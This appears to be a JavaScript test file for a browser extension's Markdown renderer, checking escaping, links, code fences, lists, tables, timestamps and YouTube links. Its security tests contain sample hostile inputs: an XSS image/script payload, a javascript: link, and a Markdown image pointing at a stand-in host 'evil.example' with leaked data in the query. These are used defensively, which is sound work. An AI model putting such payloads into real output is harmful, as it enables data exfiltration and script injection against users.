import assert from 'node:assert/strict'
import { test } from 'node:test'

await import('../extension/lib/markdown.js')
const { render } = globalThis.CMMarkdown

test('escapes raw HTML instead of rendering it', () => {
  const html = render('<img src=x onerror=alert(1)> <script>bad()</script>')
  assert.ok(!html.includes('<img'))
  assert.ok(!html.includes('<script'))
  assert.ok(html.includes('&lt;img'))
})

test('never renders Markdown images (no remote loads)', () => {
  const html = render('![x](https://evil.example/leak?data=secret)')
  assert.ok(!html.includes('<img'))
})

test('links: only http(s) and mailto, opened safely', () => {
  const ok = render('[docs](https://example.com/a?b=1&c=2)')
  assert.match(ok, /<a href="https:\/\/example\.com\/a\?b=1&amp;c=2" target="_blank" rel="noopener noreferrer">docs<\/a>/)
  const bad = render('[x](javascript:alert(1))')
  assert.ok(!bad.includes('href="javascript'))
})

test('fenced code keeps content literal and gets a copy button', () => {
  const html = render('```js\nconst a = "<b>"\n```')
  assert.match(html, /class="cm-code"/)
  assert.match(html, /data-lang="js"/)
  assert.match(html, /&lt;b&gt;/)
  assert.match(html, /cm-copy-code/)
})

test('unclosed fence while streaming still renders as code', () => {
  assert.match(render('Here:\n```py\nprint(1)'), /<pre><code data-lang="py">print\(1\)<\/code><\/pre>/)
})

test('inline formatting and code spans', () => {
  const html = render('**bold** and *it* and `a*b*c` and ~~gone~~')
  assert.match(html, /<strong>bold<\/strong>/)
  assert.match(html, /<em>it<\/em>/)
  assert.match(html, /<code>a\*b\*c<\/code>/)
  assert.match(html, /<del>gone<\/del>/)
})

test('nested and ordered lists, task items', () => {
  const html = render('- a\n  - b\n- c\n\n3. three\n4. four\n\n- [x] done\n- [ ] todo')
  assert.match(html, /<ul><li>a<ul><li>b<\/li><\/ul><\/li><li>c<\/li><\/ul>/)
  assert.match(html, /<ol start="3"><li>three<\/li><li>four<\/li><\/ol>/)
  assert.match(html, /class="task"><input type="checkbox" disabled checked> done/)
})

test('tables with alignment', () => {
  const html = render('| a | b |\n|:--|--:|\n| 1 | 2 |')
  assert.match(html, /<th style="text-align:left">a<\/th>/)
  assert.match(html, /<td style="text-align:right">2<\/td>/)
})

test('headings are demoted below the panel title', () => {
  assert.match(render('# Title'), /<h3>Title<\/h3>/)
})

test('timestamps become seek buttons only when asked', () => {
  assert.match(render('At [4:12] and (1:02:03)', { timestamps: true }), /data-seconds="252">4:12<\/button>.*data-seconds="3723"/)
  assert.ok(!render('At [4:12]').includes('<button'))
})

test('YouTube links carry the video id and start time', () => {
  const { youTube } = globalThis.CMMarkdown
  assert.deepEqual(youTube('https://www.youtube.com/watch?v=dQw4w9WgXcQ&t=83s'), { id: 'dQw4w9WgXcQ', seconds: 83 })
  assert.deepEqual(youTube('https://youtu.be/dQw4w9WgXcQ?t=1m5s'), { id: 'dQw4w9WgXcQ', seconds: 65 })
  assert.deepEqual(youTube('https://m.youtube.com/shorts/dQw4w9WgXcQ'), { id: 'dQw4w9WgXcQ', seconds: null })
  assert.equal(youTube('https://example.com/watch?v=dQw4w9WgXcQ'), null)
  const html = render('[1:23](https://www.youtube.com/watch?v=dQw4w9WgXcQ&t=83) and https://youtu.be/dQw4w9WgXcQ?t=2h')
  assert.match(html, /data-yt="dQw4w9WgXcQ" data-seconds="83">1:23<\/a>/)
  assert.match(html, /data-yt="dQw4w9WgXcQ" data-seconds="7200">https:\/\/youtu\.be/)
})
